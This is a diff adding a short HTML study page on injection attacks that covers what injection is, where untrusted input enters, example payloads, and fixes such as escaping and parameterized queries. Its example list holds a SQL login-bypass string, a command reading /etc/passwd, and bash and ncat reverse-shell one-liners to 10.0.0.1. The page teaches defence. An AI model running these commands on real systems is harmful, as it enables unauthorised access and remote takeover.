@@ -1,0 +1,41 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Injection</title>
+</head><body><b><span style="font-size: 16pt"><br/>
+Injection<br/>
+</span></b><ul><span style="font-size: 13pt"><li>Injection means to inject</li>
+<li>An attacker sends a query (basically injected) into any server, if the server interprets it, BOOM !!</li>
+<li>Any interpreter which combines data into command is vulnerable to injection Attacks</li>
+</span><li><span style="font-size: 13pt">Types: SQL Injection, LDAP Injection, OS Injection, Command Execution, Ruby Injection, Shell Shock, etc.</span></li>
+</ul>
+<span style="font-size: 13pt"><br/>
+<br/>
+</span><b><span style="font-size: 16pt">Why Injection Happens</span></b><span style="font-size: 13pt"><br/>
+</span><ul><li><span style="font-size: 13pt">Untrusted data directly interpreted</span>.</li>
+<li><span style="font-size: 13pt"><span style="color: #ff0000">Where can you send the untrusted data?</span></span></li>
+<span style="font-size: 13pt"><li style="list-style-type: none"><span style="color: #000000">HTTP request,in the form of URL parameters, form fields, headers</span>, or cookies.</li>
+<li>Everywhere </li>
+</span></ul>
+<br/>
+<b><span style="font-size: 16pt"><br/>
+</span></b><b><span style="font-size: 16pt">What can be achieved by Injection</span></b><span style="font-size: 13pt"><br/>
+</span><ul><li><span style="font-size: 13pt">If the attacker is able to inject his query or command, he can perform desirable actions into the server.</span></li>
+<span style="font-size: 13pt"><li><b>SQLi</b>: &quot;101 or 1=1&quot;. 				<b>(</b>A true query to do login bypass<b>)</b></li>
+<li>cat /etc/passwd     				<b>(</b>command to read users in linux<b>)</b></li>
+<li>bash -i &gt;&amp;/dev/tcp/10.0.0.1/4242 0&gt;&amp;1   <b>(</b>one liner bash for reverse connection<b>)</b></li>
+</span><li><span style="font-size: 13pt">ncat 10.0.0.1 4242 -e /bin/bash 		<b>(</b>one liner nc for reverse connection<b>)</b></span></li>
+</ul>
+<br/>
+<br/>
+<b><span style="font-size: 16pt">How do we fix Injection issues</span></b><br/>
+<ul><li><span style="font-size: 13pt"><b>Validation</b>- means input validation</span></li>
+<span style="font-size: 13pt"><li><b>Escaping aka Output Encoding</b></li>
+<li style="list-style-type: none"><ul><li>Escaping is the primary means to make sure that untrusted data can't be used to convey an injection attack.</li>
+<li>There is <b>no harm </b>in escaping data properly- it will still render in the browser properly.</li>
+<li>Escaping simply lets the interpreter know the data is not intended to be executed, and therefore prevents attacks from working.</li>
+</ul>
+</li>
+<li><b>Parameterized Queries : </b>Using safe interfaces</li>
+</span></ul>
+</body></html>
